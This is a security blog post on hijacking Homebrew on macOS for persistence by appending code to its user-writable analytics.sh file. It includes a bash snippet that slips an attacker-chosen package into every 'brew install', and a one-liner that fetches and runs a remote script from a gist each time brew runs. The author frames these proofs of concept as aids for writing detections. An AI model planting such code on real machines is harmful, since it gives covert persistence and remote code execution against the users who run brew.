---
author: noncetonic
layout: post
title: HomeBrood 0x00 - Surreptitious hijacking of Homebrew on macOS
tags: [MacOS, Persistence]
---

## Foreward 

I thought it might be fun to poke at Homebrew and see what kind of things I could find. Welcome to the beginning of what I hope will be a small but fun series of posts on abusing HomeBrew.

HomeBrood 0x00

## Homebrew Analytics

By default, `homebrew` is set to phone home to Google Analytics over HTTPS and provide a number of known, documented, metadata strings claimed by the Homebrew team to help maintainers and as such "leaving it on is appreciated".

The more paranoid-inclined user seeking to cut down on the data they freely hand over to Google and other analytic companies may already know to disable analytics right after installing homebrew and before going off and installing packages. Unfortunately, as will be shown homebrew analytics can be far more dangerous than it would appear.

Check out https://github.com/Homebrew/brew/blob/master/docs/Analytics.md to read more about the information gathered by Homebrew Analytics and how to disable this feature or just run `brew analytics off` to disable Homebrew Analytics if `brew analytics` does not return "Analytics is disabled."

### Analytricks

Reading through `/usr/local/Homebrew/Library/Homebrew/brew.sh` reveals an interesting opportunity for a number of possible scenarios for attacks but a basic example of persistence will be provided here to keep with the context of this file.

```
# Don't need shellcheck to follow this `source`.
# shellcheck disable=SC1090
source "$HOMEBREW_LIBRARY/Homebrew/utils/analytics.sh"
setup-analytics
```
> From `/usr/local/Homebrew/Library/Homebrew/brew.sh`

First and foremost the `$HOMEBREW_LIBRARY/Homebrew/utils/analytics.sh` file (full, expanded path `/usr/local/Homebrew/Library/Homebrew/utils/analytics.sh`) is sourced blindly without attempting to ensure the file even exists and then proceeds to run the newly exported `setup-analytics` function donated by analytics.sh. This means that even when Homebrew Analytics has been explicitly disabled on a system it is not until after all code within `analytics.sh` is run that Homebrew checks whether or not analytics should be sent.

It's simple to see how easily the user-owned, user-writeable `analytics.sh` file can be abused by simply adding commands to the end of the `analytics.sh` file or within the  `setup-analytics` function, hell you're free to write your own bash script altogether and including an empty setup-analytics function to keep from causing an error. This all happens pretty early on in the logic for subcommands of the `brew` command; shortly after determining the subcommand and well before processing package names and subcommand options are slurped in for processing. This makes it possible to pass a malicious package name during a `brew install` command in addition to running just about anything you want.

Let's explore some of these attacks and their implementation.

#### Hijacking `brew install`

Add the following tiny modification at the bottom of the `analytics.sh` file

```
# Prepend a defined package to all invocations of `brew install`
if [[ "$HOMEBREW_COMMAND" = "install" ]]
then
  set "YOUR_DESIRED_PACKAGE_HERE" "$@"
fi
```

Nice and easy. As the `analytics.sh` file is sourced into `brew.sh` we are lucky enough to have access to the `$HOMEBREW_COMMAND` variable which holds the subcommand sent to the `brew` command as well as `$@` which contains the arguments passed to the subcommand.

Presumably the possibly most esoteric bit of code here for beginner BASH scripters is the line starting with `set`.  
The `set` command allows rearranging the order of the arguments passed on the commandline and in this example simply prepends whichever package you choose  to the list of arguments the user provided which ensures our desired package is installed first and can hopefully get lost in the wall of text generated during a `brew install`.

This same concept can be applied to run any commands you want, you are not limited to simply brew commands. For example if you'd just like to have a compromised host send a request to a server wehenever `brew` is run as a way of gaining access to the network in case of being forcefully ejected from the network or just because networks are hard a simple script could be written which sends a GET request to a remotely hosted file and executing any commands within that file.

```
bash <(curl -s https://gist.githubusercontent.com/n0ncetonic/1d965369574a413b4dd1e4514e27992a/raw/675a9546c6ecdb46ce5a6b13a7faf63428359e53/example.sh)
```

Adding this simple one-liner into `analytics.sh` will cause the contents of the remote file to be run whenever `brew` is run.

## Closing

These PoCs are intended to be used as demos in aiding teams attempting to write detections around TTPs which could be leveraged by threat actors to avoid triggering common persistence detection checks . The potential for far more complex payloads which take advantage of this Technique are the responsibility of the reader to create.

If you do happen to come up with something fun that takes advantage of this simple `brew` command hijack please let me know via twitter @noncetonic
